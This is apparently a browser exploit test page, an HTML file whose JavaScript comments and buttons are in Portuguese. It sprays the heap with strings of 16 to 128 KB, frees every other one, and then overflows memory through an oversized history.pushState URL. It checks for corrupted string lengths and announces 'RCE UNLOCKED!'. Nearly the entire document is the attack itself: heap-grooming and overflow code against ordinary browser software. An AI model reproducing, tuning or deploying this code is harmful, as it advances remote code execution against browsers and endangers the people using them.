<!DOCTYPE html>
<html>
<head>
    <title>Size Downgrade: Buscando Strings Inline</title>
    <style>
        body { background-color: #000; color: #ff00ff; font-family: monospace; padding: 20px; }
        button { 
            font-size: 20px; padding: 15px; width: 100%; border: 2px solid #ff00ff; background: #220022; color: #fff; cursor: pointer; margin-bottom: 10px;
        }
        #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px;}
        .win { background-color: #ff00ff; color: #000; font-weight: bold; font-size: 1.6em; padding: 10px; border: 3px solid white; }
    </style>
</head>
<body>

    <h1>Size Downgrade</h1>
    <p>Tentando achar strings "Inline" onde o Length fica junto dos Dados.</p>

    <button onclick="runTest(128 * 1024)">1. Testar 128 KB</button>
    <button onclick="runTest(64 * 1024)">2. Testar 64 KB</button>
    <button onclick="runTest(32 * 1024)">3. Testar 32 KB</button>
    <button onclick="runTest(16 * 1024)">4. Testar 16 KB</button>
    
    <div id="log">Pronto. Reinicie o console.</div>

    <script>
        // O Overflow precisa ser agressivo para cobrir o desalinhamento dos objetos menores
        const BASE_OFFSET = 709520; 
        const OVERFLOW_AMT = 1024 * 128; // 128KB de cobertura

        var victims = [];

        function log(msg, type) {
            const el = document.getElementById('log');
            let cls = type === 'win' ? 'class="win"' : '';
            el.innerHTML += `<div ${cls}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        async function runTest(targetBytes) {
            log(`--- TESTANDO TAMANHO: ${targetBytes / 1024} KB ---`);
            
            // Header estimado de 24 bytes para StringImpl
            const payloadSize = targetBytes - 24;

            // 1. Limpeza
            victims = [];
            await forceGC();

            try {
                // 2. Spray de Strings Médias (TextDecoder)
                let rawBuffer = new Uint8Array(payloadSize);
                rawBuffer.fill(0x42); 
                let decoder = new TextDecoder("utf-8");
                let baseString = decoder.decode(rawBuffer);

                // Aumentamos a quantidade porque os objetos são menores
                // Queremos preencher o mesmo volume de RAM (~40MB)
                const SPRAY_COUNT = Math.floor((40 * 1024 * 1024) / targetBytes);
                
                log(`Alocando ${SPRAY_COUNT} strings...`);
                
                for(let i=0; i<SPRAY_COUNT; i++) {
                    let s = i + "_" + baseString.substring((i+"_").length);
                    victims.push(s);
                }

                // 3. Buracos
                log("Abrindo buracos...");
                for(let i=0; i<SPRAY_COUNT; i+=2) victims[i] = null;
                await forceGC();

                // 4. Exploit
                log("Disparando...");
                setTimeout(() => {
                    try {
                        let buffer = "A".repeat(BASE_OFFSET);
                        buffer += "\x01".repeat(OVERFLOW_AMT);
                        
                        history.pushState({}, "downgrade", "/" + buffer);

                        checkVictims(payloadSize);

                    } catch (e) {
                        log("Erro: " + e.message);
                    }
                }, 500);

            } catch(e) {
                log("Erro Memória: " + e.message);
            }
        }

        function checkVictims(expectedLen) {
            let success = false;
            for(let i=1; i<victims.length; i+=2) {
                let s = victims[i];
                if(!s) continue;

                try {
                    let err = new Error(s);
                    let msg = err.message;

                    // SUCESSO (RCE)
                    if (msg.length !== expectedLen) {
                        log(`!!! JACKPOT !!! Length Corrompido com ${expectedLen+24} bytes!`, 'win');
                        log(`Novo Tamanho: ${msg.length}`, 'win');
                        alert("RCE UNLOCKED!");
                        success = true;
                        break;
                    }

                    // SUCESSO PARCIAL (Dados)
                    if (msg.charCodeAt(0) === 1) {
                         log(`[Dados Atingidos] String ${i} (Conteúdo sujo).`);
                         success = true; // Sabemos que acertamos, só falta o header estar lá
                         // Se acertamos dados mas não length em strings pequenas,
                         // precisamos recuar o offset manualmente depois.
                    }

                } catch(e) {}
            }
            if(!success) log("Nada atingido. Tente outro tamanho.");
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 600));
        }
    </script>
</body>
</html>
